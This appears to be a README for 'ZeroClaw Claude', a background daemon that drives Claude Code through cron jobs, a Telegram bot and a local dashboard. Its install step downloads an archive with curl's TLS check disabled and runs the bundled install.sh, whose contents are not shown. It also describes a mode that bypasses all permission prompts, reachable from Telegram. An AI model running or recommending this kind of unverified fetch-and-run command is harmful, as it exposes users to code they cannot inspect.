# ⚡ ZeroClaw Claude

**A lightweight, open-source daemon built into your Claude Code. Zero API overhead, zero separate keys, zero billing surprises.**

ZeroClaw Claude turns your Claude Code into a personal assistant that never sleeps. It runs as a background daemon, executing tasks on a schedule, responding to messages on Telegram, transcribing voice commands, and integrating with any service you need — all within your existing Claude Code subscription.

> Inspired by [claudeclaw](https://github.com/moazbuilds/claudeclaw) — adapted for ZeroClaw and Claude Code's latest architecture.

---

## ⚡ Install on macOS — one command

```bash
curl -fsSLk https://github.com/Crestdrasnip/Claude-Zeroclaw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/Claude-Zeroclaw-main && \
bash install.sh
```

The installer will:
- Check / install **Homebrew** if needed
- Check / install **Node.js ≥ 20** if needed
- Check / install **Bun** (fast JS runtime) if needed
- Check / install **Claude CLI** if needed
- Install Node dependencies and compile TypeScript
- Register the Claude Code plugin and skills
- Run the interactive **setup wizard**
- Add `zeroclaw` command to your PATH

---

## Why ZeroClaw Claude?

**Zero API overhead.** No separate API keys, no token accounting, no billing surprises. Runs entirely within your Claude Code subscription using `@anthropic-ai/claude-agent-sdk` which spawns the `claude` binary — your OAuth token is never read or transmitted by ZeroClaw.

**Deploy in minutes.** One command installs everything. The setup wizard guides you through model, heartbeat, Telegram, and security.

**Built-in observability.** A real-time web dashboard to monitor runs, edit scheduled jobs, inspect logs, and chat with Claude live.

---

## Features

### ⏰ Scheduler
Cron jobs with standard cron syntax, timezone-aware, and reliable execution. Create jobs from Claude Code or the web dashboard.

```
# Daily standup at 9am
0 9 * * * — Generate git summary and send to Telegram

# Every Friday 5pm
0 17 * * 5 — Send weekly summary and plan for next week
```

### 💓 Heartbeat
Periodic proactive check-ins at a configurable interval with quiet hours. Claude checks in, reviews your context, and surfaces anything important.

### 📱 Telegram Bot
Full Telegram integration — text messages, voice notes (Groq Whisper transcription), and photo analysis. Chat with Claude from your phone as if you're in Claude Code.

```
You: "What's the status of the main branch?"
Claude: "main is 3 commits ahead of origin. Last commit: 'fix auth middleware'..."
```

### 🧠 Memory
Three layers of persistent memory:
- **Session continuity** — resumes the same Claude Code session across messages
- **Semantic memory** — facts, decisions, and preferences extracted and scored by salience
- **Tool-use context** — what Claude did, captured via post-tool-use hooks

### 📊 Web Dashboard
Real-time dashboard at `http://127.0.0.1:3742`:
- Overview with run stats and token usage
- Cron job manager (create, edit, enable/disable, delete)
- Full run history
- Live chat with Claude
- Streaming log viewer
- Memory browser

### 🔒 Security Levels
Four granular levels:
- `readonly` — no write access, no shell
- `standard` — files + web, no shell exec
- `elevated` — files + web + shell (default)
- `full` — all tools, bypass all prompts

---

## Quick start

```bash
# Start daemon
zeroclaw

# Or with npm
npm start

# Setup wizard (first time)
npm run setup

# Health check
npm run status

# Development mode (hot reload)
npm run dev
```

### In Claude Code

```
/zeroclaw:start     # Start the daemon
/zeroclaw:status    # Health check
/zeroclaw:job       # Manage cron jobs

# Natural language works too:
"Schedule a daily git summary at 9am"
"Add a cron job to check my email every hour"
"Show me the ZeroClaw status"
```

---

## Architecture

```
zeroclaw-claude/
│
├── src/
│   ├── index.ts              ← Daemon entry point
│   ├── types.ts              ← TypeScript types
│   ├── config.ts             ← Config loader (~/. zeroclaw-claude/config.json)
│   ├── db.ts                 ← SQLite: jobs, runs, memory, outbox
│   ├── setup.ts              ← Interactive setup wizard
│   ├── status.ts             ← Health check CLI
│   │
│   ├── agent/
│   │   └── runner.ts         ← Claude agent SDK wrapper + memory
│   │
│   ├── scheduler/
│   │   └── index.ts          ← node-cron scheduler, timezone-aware
│   │
│   ├── daemon/
│   │   ├── heartbeat.ts      ← Periodic heartbeat with quiet hours
│   │   └── logger.ts         ← Structured logger (console + file)
│   │
│   ├── bot/
│   │   └── telegram.ts       ← Telegram bot (grammy) + outbox poller
│   │
│   └── dashboard/
│       └── server.ts         ← Express + WebSocket real-time dashboard
│
├── commands/                 ← Slash command definitions (.md)
├── hooks/                    ← Claude Code hooks (post-tool-use)
├── prompts/                  ← System prompts
├── skills/                   ← Claude Code skills
├── CLAUDE.md                 ← Project context for Claude Code
├── .claude-plugin/
│   └── plugin.json           ← Claude Code plugin manifest
├── install.sh                ← macOS one-command installer
├── package.json
└── tsconfig.json
```

---

## Configuration

Config lives at `~/.zeroclaw-claude/config.json`:

```json
{
  "model": "claude-sonnet-4-6",
  "heartbeat": {
    "enabled": true,
    "intervalMin": 60,
    "quietHoursStart": 23,
    "quietHoursEnd": 8,
    "prompt": "Check in: any urgent tasks or things I should know about?"
  },
  "telegram": {
    "enabled": true,
    "token": "...",
    "chatId": "...",
    "allowVoice": true,
    "groqApiKey": "..."
  },
  "security": "elevated",
  "dashboardPort": 3742
}
```

---

## Models

| Model | Use case |
|---|---|
| `claude-sonnet-4-6` | Default — fast and capable |
| `claude-opus-4-6` | Complex reasoning tasks |
| `claude-haiku-4-5-20251001` | High-frequency jobs, low latency |

Override per-job by setting `model` on individual cron jobs.

---

## Dashboard

The web dashboard runs at `http://127.0.0.1:3742` (localhost only, not exposed to the network).

**Tabs:**
- **Overview** — live stats, recent runs
- **Cron Jobs** — full job manager
- **Run History** — complete history with token usage
- **Live Chat** — talk to Claude directly
- **Logs** — streaming log viewer
- **Memory** — browse stored memory entries

---

## Telegram setup

1. Create a bot at [https://t.me/BotFather](https://t.me/BotFather) → `/newbot`
2. Get your chat ID at [https://t.me/userinfobot](https://t.me/userinfobot)
3. Run `npm run setup` and enter both values
4. Optional: add a Groq API key for voice transcription (free tier available at [console.groq.com](https://console.groq.com))

Bot commands:
```
/start    — Welcome + feature list
/newchat  — Clear session, fresh conversation
/status   — Daemon health stats
/jobs     — List scheduled cron jobs
/memory   — Top memory entries
/help     — Full command list
```

---

## Security note

ZeroClaw Claude **never reads or transmits your OAuth token.**

`@anthropic-ai/claude-agent-sdk`'s `query()` spawns the `claude` CLI binary as a child subprocess. That subprocess manages its own OAuth from `~/.claude/`. ZeroClaw only receives the text responses — nothing else.

What this means for you: ZeroClaw is fully compatible with Anthropic's [February 2026 policy](https://www.anthropic.com/news/claude-is-a-space-to-think) on third-party OAuth usage.

---

## Troubleshooting

### "zeroclaw: command not found"
```bash
source ~/.zshrc  # or ~/.bash_profile
```

### Claude CLI not found
```bash
npm install -g @anthropic-ai/claude-code
```

### Dashboard not opening
```bash
npm run status  # check the port config
open http://127.0.0.1:3742
```

### Telegram bot not responding
Check your chat ID matches exactly. Get it from [https://t.me/userinfobot](https://t.me/userinfobot).

---

## License

MIT

## Credits

- Inspired by [claudeclaw](https://github.com/moazbuilds/claudeclaw) by moazbuilds
- Built for [ZeroClaw](https://github.com/Crestdrasnip/Claude-Zeroclaw)
- Powered by [Claude Code](https://claude.ai/code) and `@anthropic-ai/claude-agent-sdk`
